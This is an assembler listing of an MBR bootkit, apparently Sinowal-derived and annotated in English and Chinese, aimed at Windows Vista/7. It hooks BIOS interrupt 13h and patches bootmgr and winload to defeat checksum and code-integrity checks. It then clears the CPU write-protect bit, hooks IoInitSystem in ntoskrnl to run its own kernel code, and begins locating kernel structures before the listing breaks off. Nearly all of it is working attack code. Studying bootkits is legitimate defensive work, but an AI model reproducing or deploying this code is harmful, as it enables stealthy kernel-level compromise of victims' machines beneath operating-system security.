     1                                  ; this code will be loaded in 0x7e00
     2                                  [bits 16]
     3                                  CPU 386 
     4                                  org 00h
     5                                  
     6                                  ; save all regs before execute the origin code
     7 00000000 6660                    pushad
     8                                  
     9                                  ; allocate 4096 bytes for the interrupt 13h background service
    10 00000002 BE1304                  mov si,0413h    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
    11 00000005 832C04                  sub [si],word 4  ; 4096 bytes
    12 00000008 AD                      lodsw  ;  
    13 00000009 C1E006                  shl ax,6  ; * 1024 / 16
    14 0000000C 8EC0                    mov es,ax   ; store segment address
    15 0000000E 31FF                    xor di,di   ; offset
    16                                  
    17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
    18 00000010 BE007E                  mov si,7e00h
    19 00000013 66B9[61040000]          mov ecx,Total_End_of_Binary
    20 00000019 F3A4                    rep movsb
    21                                  
    22                                  ; backup old int 13h vector
    23 0000001B 66A14C00                mov eax,[13h * 4]     ; backup IVT vector 13h
    24 0000001F 2666A3[EA00]            mov [es:Forward_Interrupt_13h_Original + 1],eax   ; store the old jump address
    25                                  
    26                                  ; hook int 13h
    27 00000024 C7064C00[EE00]          mov [13h * 4],word Interrupt_13h_Hook  ; new address to jump to on "int 13h" instruction
    28 0000002A 8C064E00                mov [13h * 4 + 2],es     ; set segment to jump to on int 13h
    29                                  
    30 0000002E BE[5800]                mov si,Stage_0_Message
    31 00000031 81C6007E                add si, 7e00h
    32 00000035 E80A00                  call Print_Text
    33 00000038 E86301                  call wait_key
    34 0000003B 6661                    popad
    35                                  
    36                                  execute_origin_mbr:
    37                                  ; this will execute the origin mbr 
    38 0000003D EA007C0000              jmp 0000h:7c00h
    39                                  
    40                                  ; prints the text given in si
    41                                  Print_Text:
    42 00000042 6660                     pushad
    43 00000044 9C                      pushf
    44 00000045 BB0700                  mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
    45 00000048 B40E                    mov ah,0Eh                                      ; Function 0Eh: Teletype Output
    46                                  
    47 0000004A 2EAC                    cs lodsb                                        ; load the first character
    48                                  
    49                                  Next_Char:
    50 0000004C CD10                    int 10h
    51 0000004E 2EAC                    cs lodsb                                        ; al = next character
    52 00000050 08C0                    or al,al                                        ; last letter?
    53 00000052 75F8                    jnz Next_Char                                   ; if not print next letter
    54 00000054 9D                      popf
    55 00000055 6661                    popad
    56 00000057 C3                      ret
    57                                  
    58 00000058 5E5F5F5F5F5E202070-     Stage_0_Message                 db      '^____^  press any key to continue:',13,10, 0
    58 00000061 7265737320616E7920-
    58 0000006A 6B657920746F20636F-
    58 00000073 6E74696E75653A0D0A-
    58 0000007C 00                 
    59 0000007D 426F6F746D67725F73-     Bootmgr_sign_found_Message                 db      'Bootmgr_sign_found press any key to patch SU module to gain control in protect mode:',13,10, 0
    59 00000086 69676E5F666F756E64-
    59 0000008F 20707265737320616E-
    59 00000098 79206B657920746F20-
    59 000000A1 706174636820535520-
    59 000000AA 6D6F64756C6520746F-
    59 000000B3 206761696E20636F6E-
    59 000000BC 74726F6C20696E2070-
    59 000000C5 726F74656374206D6F-
    59 000000CE 64653A0D0A00       
    60 000000D4 496E74657272757074-     Interrupt_13h_Message          db      'Interrupt_13h call',13,10, 0
    60 000000DD 5F3133682063616C6C-
    60 000000E6 0D0A00             
    61                                  
    62                                  Forward_Interrupt_13h_Original:
    63                                  ; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
    64 000000E9 EA00000000              jmp word 0000h:0000h
    65                                  
    66                                  ; now our background "service" starts, we get control only by int 13
    67                                  ; the code is now located at the end of memory (most likely 9F400h)
    68                                  ;direct declare string for print will crash because this code wille be relocate.
    69                                  Interrupt_13h_Hook:
    70                                  ; backup cpu ctx
    71 000000EE 6660                        pushad
    72 000000F0 9C                          pushf
    73 000000F1 80FC42                      cmp ah,42h                                                                      ; Extended Read?
    74 000000F4 7407                        jz read_handler
    75 000000F6 80FC02                      cmp ah,02h                                                                      ; Read?
    76 000000F9 0F859A00                    jnz exit_and_call_origin
    77                                  read_handler:
    78 000000FD BE[D400]                    mov si,Interrupt_13h_Message
    79 00000100 E83FFF                      call Print_Text
    80                                  
    81                                  ; restore cpu ctx
    82 00000103 9D                          popf
    83 00000104 6661                        popad
    84 00000106 50                          push ax; save the cmd
    85                                      ; simulate interrupt instruction
    86 00000107 9C                          pushfw
    87 00000108 0E                          push cs
    88 00000109 E8DDFF                      call word Forward_Interrupt_13h_Original
    89 0000010C 0F828100                    jc read_fail_handler
    90                                  
    91                                      ; read disk ok,   need more handle so save the result
    92 00000110 6660                        pushad ; 32
    93 00000112 9C                          pushf ; 2
    94                                  
    95 00000113 1E                          push ds  ; 2 data segment register will be modified to access this modules data
    96 00000114 06                          push es; 2
    97                                  
    98 00000115 89DF                        mov di,bx    ; di will store target buffer
    99 00000117 89E5                        mov bp,sp
   100 00000119 807E2602                    cmp byte [bp+ 38], 02h
   101 0000011D 7406                        jz Parameters_Normalized
   102 0000011F 8B4C02                      mov cx,[si+0x2]  ;get sector count
   103 00000122 C47C04                      les di,[si+0x4] ; get buffer
   104                                      Parameters_Normalized:
   105 00000125 C1E109                      shl cx,9 ; number of bytes = sector count * 512
   106 00000128 FC                          cld
   107                                  
   108                                      ; skip scan if bootmgr already patched.
   109                                      ;test [cs:Configuration_Bits],byte 00001000b 
   110                                      ;jnz bootmgr_already_patched
   111                                  
   112                                      ; now scan the read buffer for a signature in bootmgr
   113                                      ;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
   114                                      ;     Windows Vista/7 bootmgr at address 06F2h
   115                                      ; patch applied: hooking code to call protected mode part
   116                                      ;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
   117                                      ;   000205ef:  cbw                              ; 98        ->    
   118                                      ;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
   119                                      ;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
   120                                      ;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
   121                                      ;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
   122                                      Search_Signature_3:
   123 00000129 B08A                        mov al,8Ah
   124 0000012B F2AE                        repne scasb
   125 0000012D 755B                        jnz read_ok_handler                                                     ; if not found => exit
   126 0000012F 26803D46                    cmp byte [es:di],0x46
   127 00000133 75F4                        jnz Search_Signature_3
   128 00000135 2666817D02983D0000          cmp dword [es:di+2],00003D98h
   129 0000013E 75E9                        jnz Search_Signature_3
   130 00000140 2666817D067503E903          cmp dword [es:di+6],03E90375h
   131 00000149 75DE                        jnz Search_Signature_3
   132 0000014B 2666817D0A00E93500          cmp dword [es:di+10],0035E900h
   133 00000154 75D3                        jnz Search_Signature_3
   134                                  
   135                                      ; apply patch:
   136                                      ;   + 66 9A ADDRESS 20 90
   137                                      Found_Signature_bootmgr:
   138 00000156 2E800E[9D01]08              or [cs:Configuration_Bits],byte 00001000b 
   139 0000015C 4F                          dec di
   140 0000015D BE[7D00]                    mov si,Bootmgr_sign_found_Message
   141 00000160 E8DFFE                      call Print_Text
   142 00000163 E83800                      call wait_key
   143                                      ;jmp read_ok_handler
   144                                     ;jmp Remove_Interrupt_13h_Hook
   145                                      
   146                                      ; do patch work
   147 00000166 26C705669A                  mov word [es:di],0x9A66   ; patch something
   148 0000016B 6631C0                      xor eax,eax
   149 0000016E 8CC8                        mov ax,cs
   150 00000170 66C1E004                    shl eax,4
   151 00000174 6605[A9010000]              add eax,Entry_Point_OS_Vista
   152 0000017A 2666894502                  mov [es:di+0x2],eax 
   153 0000017F 26C745062000                mov word [es:di+0x6],0x20  
   154 00000185 26C6450890                  mov byte [es:di+0x8],0x90 
   155                                  
   156                                  ;Remove_Interrupt_13h_Hook:
   157                                      ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
   158                                     ; xor bx,bx
   159                                      ;mov ds,bx
   160                                    ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)
   161                                  
   162                                  bootmgr_already_patched:
   163                                  read_ok_handler:
   164 0000018A 07                      pop es   ; restore all register contents as it was before this hook
   165 0000018B 1F                      pop ds
   166 0000018C 9D                      popf
   167 0000018D 6661                    popad
   168 0000018F B400                    mov ah,0
   169                                  read_fail_handler:
   170 00000191 83C402                      add sp, 2 ; pop the cmd
   171 00000194 CA0200                      retf 2
   172                                  
   173                                  exit_and_call_origin:
   174 00000197 9D                          popf
   175 00000198 6661                        popad
   176 0000019A E94CFF                      jmp Forward_Interrupt_13h_Original
   177                                  
   178 0000019D 00                      Configuration_Bits    db  00000000b
   179                                  
   180                                  wait_key:
   181 0000019E 6660                    pushad
   182 000001A0 9C                      pushf
   183 000001A1 30E4                    xor ah,ah                                       ; Function 00h: Get Keystroke
   184 000001A3 CD16                    int 16h
   185 000001A5 9D                      popf
   186 000001A6 6661                    popad
   187 000001A8 C3                      ret
   188                                  
   189                                  ; protected code start called by bootmgr SU module
   190                                  [bits 32]
   191                                  Entry_Point_OS_Vista:
   192 000001A9 90                      nop
   193 000001AA 90                      nop
   194 000001AB 90                      nop
   195 000001AC 90                      nop
   196 000001AD 60                      pushad
   197 000001AE 06                      push es
   198 000001AF 1E                      push ds
   199                                  
   200                                  ; we need to set correct segment register (this is also why this function was far called)
   201                                  ;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
   202                                  ;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   203                                  ;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
   204                                  ;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   205                                  ;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   206                                  ;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
   207                                  ;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
   208                                  ;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
   209                                  ;   gdtr:base=0x0001f000, limit=0x7f
   210                                  ;   idtr:base=0x0001f080, limit=0x7ff
   211 000001B0 B830000000              mov eax,0x30   ; set to 30h, Data Segment
   212 000001B5 8EC0                    mov es,ax
   213 000001B7 8ED8                    mov ds,ax
   214                                  ; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
   215 000001B9 BF00004000              mov edi,00400000h   ; OS Loader base
   216 000001BE B900000F00              mov ecx,960 * 1024 
   217 000001C3 E800000000              call dword Get_Current_EIP_2
   218                                  Get_Current_EIP_2:
   219 000001C8 5E                      pop esi
   220 000001C9 81C635010000            add esi,Relocate_Me_Code - Get_Current_EIP_2
   221 000001CF E8CD000000              call dword Hook_WinloadExe
   222                                  
   223 000001D4 1F                      pop ds   ; restore them
   224 000001D5 07                      pop es
   225 000001D6 61                      popad
   226 000001D7 CB                      retf
   227                                  
   228                                  ; 加载的第一个pe 是 bootmgr.exe.mui
   229                                  FakeImgpLoadPEImage:
   230                                  ; 1. called by OSLOADER resisting in bootmgr 
   231                                  ; 2. return address is 0x4216a8
   232                                  ; 3. ebx(0x2700c0 the pe file header   )
   233 000001D8 E82E010000              call dword Obfuscation_Function
   234                                  
   235                                  ; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
   236                                  ; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
   237                                  ; _text:004216A5 74 18                                   jz      short loc_4216BF
   238                                  ; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
   239 000001DD 0FBE4604                movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
   240 000001E1 48                      dec eax ; -1 because call [address] used 1 more byte
   241 000001E2 0144242C                add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
   242                                  ; xchg 替换成了 ebx 即 pe file header)
   243                                  
   244                                  ; why ??????????????????????????????????????
   245                                  ; get caller's eax register
   246 000001E6 8D5706                  lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
   247 000001E9 0FB64601                movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
   248 000001ED F6D0                    not al     ; = BCh
   249 000001EF 2407                    and al,00000111b        ; = 04h
   250 000001F1 0402                    add al,2        ; = 06h
   251 000001F3 8B3C84                  mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..
   252                                  
   253                                  ; valid PE Image?
   254 000001F6 813F50450000            cmp dword [edi],'PE' ; verify PE Signature
   255 000001FC 751F                    jnz Exit_FakeImgpLoadPEImage
   256 000001FE 66817F180B01            cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
   257 00000204 7517                    jnz Exit_FakeImgpLoadPEImage
   258                                  
   259                                  ; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
   260 00000206 8B4F50                  mov ecx,[edi+0x50]  ; SizeOfImage
   261 00000209 81E700F0FFFF            and edi,0FFFFF000h  ; page base address of PE Image
   262 0000020F E88D000000              call dword Hook_WinloadExe
   263 00000214 7407                    jz Exit_FakeImgpLoadPEImage
   264                                  
   265                                  ; find the signature in ntoskrnl and patch the code
   266 00000216 E844000000              call Find_Ntoskrnl_Code_Pattern
   267 0000021B 7405                    jz Patch_Kernel_Code_Vista   ; if found, patch!
   268                                  Exit_FakeImgpLoadPEImage:
   269 0000021D E908010000              jmp Obfuscation_Return ; return to Windows
   270                                  
   271                                  Patch_Kernel_Code_Vista:
   272                                  ; ebx = some address 
   273                                  ; ecx = size of image of nt kernel
   274                                  ; edi = nt kernel image base address
   275 00000222 90                      nop
   276 00000223 90                      nop
   277                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
   278                                  ; remember original jump address
   279 00000224 8B13                    mov edx,[ebx]  ; edx = [signature], must be some address
   280 00000226 8D541304                lea edx,[ebx+edx+4]  ; signature address + relative jump address + 4 = return address
   281 0000022A 89560A                  mov [esi+10],edx  ; store return address to temporary code (ntkernel_Hook_Address)
   282                                  
   283 0000022D 81C700080000            add edi,2048  
   284 00000233 EB00                    jmp Patch_Kernel_Code
   285                                  
   286                                  ; patch the NT Kernel with Kernel Code  =)
   287                                  Patch_Kernel_Code:
   288 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
   289 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
   290 00000241 81EF00080000            sub edi,2048;
   291 00000247 B964010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
   292 0000024C 57                      push edi
   293 0000024D F3A4                    rep movsb
   294 0000024F 5F                      pop edi
   295                                  
   296 00000250 83C735                  add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code   ; -> absolute Kernel Code entry point address
   297 00000253 29DF                    sub edi,ebx    ; - address of call
   298 00000255 83EF04                  sub edi,4  ; -4 because of call instruction, relative call
   299 00000258 893B                    mov [ebx],edi    ; store address
   300 0000025A E9CB000000              jmp dword Obfuscation_Return
   301                                  
   302                                  Find_Ntoskrnl_Code_Pattern:
   303                                  ; Phase1InitializationDiscard
   304                                  ; INIT:007BF3E0 6A 19                                   push    19h
   305                                  ; INIT:007BF3E2 6A 4B                                   push    4Bh
   306                                  ; INIT:007BF3E4 58                                      pop     eax
   307                                  ; INIT:007BF3E5 E8 C4 6D C4 FF                          call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
   308                                  ; INIT:007BF3EA 56                                      push    esi             ; NewIrql
   309                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
   310                                  ; INIT:007BF3F0 84 C0                                   test    al, al
   311                                  ; INIT:007BF3F2 75 07                                   jnz     short loc_7BF3FB
   312                                  ; Input
   313                                  ;   ecx = SizeOfImage
   314                                  ;   edi = Image
   315                                  ; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
   316                                  ; return status zero flag = 1 found
   317 0000025F 51                      push ecx
   318 00000260 57                      push edi
   319                                  
   320                                  ; scan ntoskrnl.exe for code patterns [+ for Vista]:
   321                                  ;   +  6A 4B 6A 19 / 6A 19 6A 4B
   322                                  ;     ntoskrnl.1CE87E0h
   323                                  ;			memory.0x80683ec9
   324                                  Scan_Pattern_Ntoskrnl:
   325 00000261 B06A                    mov al,0x6a
   326 00000263 F2AE                    repne scasb
   327 00000265 7537                    jnz Find_Ntoskrnl_Code_Pattern_Exit
   328 00000267 817FFF6A4B6A19          cmp dword [edi-0x1],0x196A4B6A
   329 0000026E 740A                    jz Signature_1_Found
   330 00000270 817FFF6A196A4B          cmp dword [edi-0x1],0x4B6A196A
   331 00000277 75E8                    jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
   332 00000279 47                      inc edi   ; weird signature
   333                                  Signature_1_Found:
   334 0000027A 807F0389                cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
   335 0000027E 7503                    jnz No_Extended_Signature
   336 00000280 83C706                  add edi,byte +0x6
   337                                  No_Extended_Signature:
   338 00000283 807F03E8                cmp byte [edi+0x3],0xe8
   339 00000287 75D8                    jnz Scan_Pattern_Ntoskrnl
   340                                  
   341                                  ; first pattern found, scan for next [same as in previous Sinowal version] signature:
   342                                  ;   + E8 ?? ?? ?? ?? 84 C0
   343                                  ;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
   344                                  ;			memory.0x80683ed8						memory.0x80683EDD
   345 00000289 8D5F08                  lea ebx,[edi+0x8]
   346 0000028C 87DF                    xchg ebx,edi
   347 0000028E B0E8                    mov al,0xe8
   348 00000290 F2AE                    repne scasb
   349 00000292 750A                    jnz Find_Ntoskrnl_Code_Pattern_Exit
   350 00000294 66817F0484C0            cmp word [edi+0x4],0xc084
   351 0000029A 87DF                    xchg ebx,edi
   352 0000029C 75C3                    jnz Scan_Pattern_Ntoskrnl
   353                                  
   354                                  Find_Ntoskrnl_Code_Pattern_Exit:
   355 0000029E 5F                      pop edi
   356 0000029F 59                      pop ecx
   357 000002A0 C3                      ret
   358                                  
   359                                  Hook_WinloadExe:
   360                                  ; Input
   361                                  ;   esi = address of Relocate_Me_Code
   362                                  ;   edi = address of memory to scan
   363                                  ;   ecx = bytes to scan
   364                                  ; Output
   365                                  ; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
   366 000002A1 51                      push ecx
   367 000002A2 57                      push edi
   368                                  
   369                                  ; scan winload for some jump offset in _ImgpLoadPEImage@36  
   370                                  ;   + 3B ?? 58 74 ?? C7
   371                                  ; patch applied: winload.exe will be hooked
   372                                  ;   0041e8c0:  cmp eax, dword ptr ds:[ebx+0x58]         ; 3b4358            ->      call [address]
   373                                  ;   0041e8c3:  jz .+0x0000000c                          ; 740c              ->
   374                                  ;   0041e8c5:  mov dword ptr ss:[ebp+0x8], 0xc0000221   ; c74508210200c0    (STATUS_IMAGE_CHECKSUM_MISMATCH)
   375                                  Search_Unknown_Signature:
   376 000002A3 B03B                    mov al,0x3b
   377 000002A5 F2AE                    repne scasb
   378 000002A7 7551                    jnz Hook_WinloadExe_Exit
   379 000002A9 66817F015874            cmp word [edi+0x1],0x7458
   380 000002AF 75F2                    jnz Search_Unknown_Signature
   381 000002B1 807F04C7                cmp byte [edi+0x4],0xC7
   382 000002B5 75EC                    jnz Search_Unknown_Signature
   383                                  
   384                                  ; backup 6 bytes to overwrite them with custom code
   385                                  ; break in 0x9edf5
   386 000002B7 4F                      dec edi                                                                         ; -1 to get to start of signature
   387 000002B8 8B07                    mov eax,[edi]                                                                   ; copy 4 bytes
   388 000002BA 8906                    mov [esi],eax
   389 000002BC 668B4704                mov ax,[edi+4]                                                                  ; copy 2 bytes
   390 000002C0 66894604                mov [esi+4],ax
   391                                  
   392                                  ; store new code: FF 15 + address  (call hook)
   393 000002C4 66B8FF15                mov ax,0x15FF  ; FF 15, opcodes of call [address]
   394 000002C8 66AB                    stosw          
   395 000002CA 8D86DBFEFFFF            lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
   396 000002D0 26894606                mov [es:esi+6],eax ; set the Hook_Address variable
   397 000002D4 8D4606                  lea eax,[esi+6]   ; get address of variable address, used for call [address]
   398 000002D7 AB                      stosd 
   399                                  
   400                                  ; restore (and store) register contents for searching the next signature
   401 000002D8 5F                      pop edi
   402 000002D9 59                      pop ecx
   403 000002DA 51                      push ecx
   404 000002DB 57                      push edi
   405                                  
   406                                  ; scan winload for the code that puts ntoskrnl corrupt error status
   407                                  ;   + 8B F0 85 F6 75   and value 0C0000098h
   408                                  ; 8B F0 85 F6 75 ?? ?? 980000c0
   409                                  ; patch applied: STATUS_FILE_INVALID error code will be overwritten
   410                                  ;   0041f076:  lock test esi, esi        ; f085f6
   411                                  ;   0041f079:  jnz .+0x0000000a          ; 750a
   412                                  ;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
   413                                  Search_Ntoskrnl_Error_Code:
   414 000002DC B08B                    mov al,0x8b
   415 000002DE F2AE                    repne scasb
   416 000002E0 7518                    jnz Hook_WinloadExe_Exit
   417 000002E2 813FF085F675            cmp dword [edi],0x75f685F0
   418 000002E8 75F2                    jnz Search_Ntoskrnl_Error_Code
   419 000002EA 817F06980000C0          cmp dword [edi+0x6],0xC0000098  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
   420 000002F1 75E9                    jnz Search_Ntoskrnl_Error_Code
   421 000002F3 C7470600000000          mov dword [edi+0x6],0x0      ;  set ret value to  STATUS_SUCCESS
   422                                  
   423                                  Hook_WinloadExe_Exit:
   424 000002FA 5F                      pop edi
   425 000002FB 59                      pop ecx
   426 000002FC C3                      ret
   427                                  
   428                                  Relocate_Me_Code:
   429 000002FD 90                      nop
   430 000002FE 90                      nop
   431 000002FF 90                      nop
   432 00000300 90                      nop
   433 00000301 90                      nop
   434 00000302 90                      nop
   435 00000303 00000000                Hook_Address    dd  0
   436 00000307 00000000                ntkernel_Hook_Address    dd  0
   437                                  
   438                                  Obfuscation_Function:
   439                                  ; [stack + 0] = address to jump to
   440                                  ; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
   441                                  
   442                                  ; Output:
   443                                  ; esi = pointer to Relocate_Me_Code
   444                                  ; edi = pointer to return code of Windows / Argument 2
   445                                  
   446                                  ; during execution all memory access is possible is cr0.wp cleared
   447                                  ; return by jumping to Obfuscation_Return
   448                                  
   449 0000030B 60                      pushad   ; +32
   450 0000030C 9C                      pushfd     ; +4
   451 0000030D FC                      cld
   452                                  
   453                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
   454 0000030E 0F20C0                  mov eax,cr0
   455 00000311 50                      push eax ; +4
   456 00000312 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
   457                                  
   458                                  ; set parameters and call
   459                                  ; the pe file header
   460 00000317 875C2428                xchg ebx,[esp+0x28]   ; ebx = return eip  
   461 0000031B 8B7C242C                mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
   462 0000031F E800000000              call dword Get_Current_EIP_0
   463                                  Get_Current_EIP_0:
   464 00000324 5E                      pop esi ; esi = eip
   465 00000325 83EE27                  sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
   466 00000328 FFE3                    jmp ebx   ; jump
   467                                  
   468                                  ; restore cr0.wp
   469                                  Obfuscation_Return:
   470 0000032A 58                      pop eax
   471 0000032B 0F22C0                  mov cr0,eax   ; everything done fine, restore it and give control back to Windows
   472                                  
   473 0000032E 9D                      popfd
   474 0000032F 61                      popad
   475 00000330 5B                      pop ebx ; exchange the value back
   476 00000331 C3                      ret   
   477                                  
   478                                  Ntoskrnl_Hook_Code:
   479 00000332 90                      nop
   480 00000333 90                      nop
   481 00000334 90                      nop
   482 00000335 FF742404                push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
   483 00000339 50                      push eax    ; first call = Execute_Kernel_Code  被 mov [esp+0x30],eax覆盖成 Execute_Kernel_Code 地址
   484 0000033A 50                      push eax     ; second call = call to original address 被 mov [esp+0x2c],eax 覆盖成 _IoInitSystem@4 地址
   485                                  ; Obfuscation_Return 的最后一条返回指令ret执行 esp 指向 这里, 所以会运行到 _IoInitSystem@4
   486                                  ; _IoInitSystem@4 运行完返回 Execute_Kernel_Code
   487 0000033B E8CBFFFFFF              call dword Obfuscation_Function
   488                                  
   489                                  ; set return obfuscation address to original address that was overwritten (forward the function)
   490 00000340 8B460A                  mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
   491                                  ; eax == _IoInitSystem@4
   492 00000343 8944242C                mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
   493                                  
   494                                  ; remove hook by reassigning jump address
   495 00000347 8B7C2438                mov edi,[esp+0x38] ; edi => return eip from this hook call
   496                                  ; edi == call    _IoInitSystem@4 的下一条指令
   497 0000034B 29F8                    sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
   498                                  ;  此处是还原 原来的patch
   499 0000034D 368947FC                mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
   500                                  
   501                                  ; set return eip of the forwarded function to Execute_Kernel_Code
   502 00000351 8D465D                  lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]  ; get address of Execute_Kernel_Code
   503 00000354 89442430                mov [esp+0x30],eax      ; and store it as return eip address
   504 00000358 EBD0                    jmp short Obfuscation_Return
   505                                  
   506                                  Execute_Kernel_Code:
   507                                  
   508                                  ; execute the Kernel Code (original hooked/forwarded initialization function returns here)
   509 0000035A E80A000000              call Kernel_Code   ; =)
   510 0000035F 90                      nop
   511 00000360 90                      nop
   512 00000361 90                      nop
   513 00000362 90                      nop
   514 00000363 90                      nop
   515 00000364 90                      nop
   516 00000365 90                      nop
   517 00000366 C20400                  ret 4      ; remove the pushed argument (as the original function would have done)
   518                                  
   519                                  Kernel_Code:
   520 00000369 60                      pushad
   521 0000036A 9C                      pushfd
   522 0000036B FC                      cld
   523                                  
   524                                  ; set ds/es/ss back again to valid Data Segment Selectors
   525 0000036C 31C0                    xor eax,eax 
   526                                  Segmentation_Check_loop:
   527 0000036E 0F03D8                  lsl ebx,ax   ; load segment limit into ebx
   528 00000371 750E                    jnz Next_Segment_Selector ; if invalid or cannot be accessed ZF = 0, next segment selector
   529 00000373 43                      inc ebx  ; +1 to get real value (normaly 0FFFFFFFFh)
   530 00000374 750B                    jnz Next_Segment_Selector     ; => if not max. (4 GB), next segment selector   (FFF..FF+1 = 0, so zero flag set if max.)
   531                                  
   532 00000376 0F02D8                  lar ebx,ax  ; load access rights into ebx
   533 00000379 80E7FA                  and bh,11111010b   ; mask out following bits: Present, DPL, System, Type [Data/Code, Write]
   534 0000037C 80FF92                  cmp bh,10010010b     ; present? system? data? write access?
   535 0000037F 7406                    je Found_Data_Segment_Selector        ;   => if yes found our Segment Selector to set
   536                                  
   537                                  Next_Segment_Selector:
   538 00000381 6683E808                sub ax,00001000b   ; next segment selector
   539 00000385 75E7                    jnz Segmentation_Check_loop    ; try next if not already the last one
   540                                  
   541                                  Found_Data_Segment_Selector:
   542                                  ; set data segment registers to data segment selectors 
   543                                  ; [usually segment selector 10h on Windows systems, which is usually ss]
   544                                  ; 0x10 r0 32bit data
   545 00000387 8EC0                    mov es,ax
   546 00000389 8ED8                    mov ds,ax
   547                                  ;mov ss,ax  ; <- ss must be same CPL as CS (!), crashes under VirtualBox
   548                                  CPU 486     ; for the wbinvd instruction
   549 0000038B 0F09                    wbinvd
   550                                  
   551                                  ; ebp Analysis:
   552                                  ;   ebp = original esp after all operations
   553                                  ;   [ebp - 4]    ZwReadFile
   554                                  ;   [ebp - 8]    ZwCreateFile
   555                                  ;   [ebp - 12]   ZwClose
   556                                  ;   [ebp - 16]   KeLoaderBlock
   557                                  ;   [ebp - 20]   ExFrePool
   558                                  ;   [ebp - 24]   ExAllocatePool
   559                                  ;   [ebp - 28]   PsLoadedModuleList
   560                                  ;   esp points here (esp = ebp)
   561                                  ;   [esp]        pointer to data below
   562 0000038D 83EC22                  sub esp,byte 34     ; create data frame on stack (later used with ebp)
   563                                  ; let's get PsLoadedModuleList
   564                                  ;  1. get IDT base
   565                                  ;  2. get address of Division by Zero (Interrupt 0) Exception Handler
   566                                  ;  3. scan memory for PE image, should be ntoskrnl then
   567                                  ;  4. scan code of ntoskrnl for a signature and extract PsLoadedModuleList pointer
   568                                  
   569                                  ; store IDTR on stack
   570 00000390 3E0F010C24              sidt [ds:esp]   ; store IDT Register on stack (32 bit address, 16 bit limit)
   571 00000395 665B                    pop bx   ; 16 bit IDT limit
   572 00000397 5B                      pop ebx     ; 32 bit IDT address
   573 00000398 89E5                    mov ebp,esp   ; = original esp - 32, = 1 PsLoadedModuleList, 6 imports, (6 bytes IDTR just popped from stack)
   574                                  
   575                                  ; get address of Interrupt 0 Handler
   576 0000039A 8B4304                  mov eax,[ebx+0x4]   ; Offset 16..31  [Interrupt Gate Descriptor]
   577 0000039D 668B03                  mov ax,[ebx]    ; Offset 0..15   [Interrupt Gate Descriptor]
   578 000003A0 2500F0FFFF              and eax,0xFFFFF000   ; page base address
   579 000003A5 93                      xchg eax,ebx      ; store address in ebx
   580                                  
   581                                  ; scan memory of Exception Handler for a PE Image -> this will resolve a pointer to ntoskrnl
   582                                  Find_Exception_Handler_PE_Image:
   583 000003A6 81EB00100000            sub ebx,4096  ; next page to check (PE images are always page aligned)
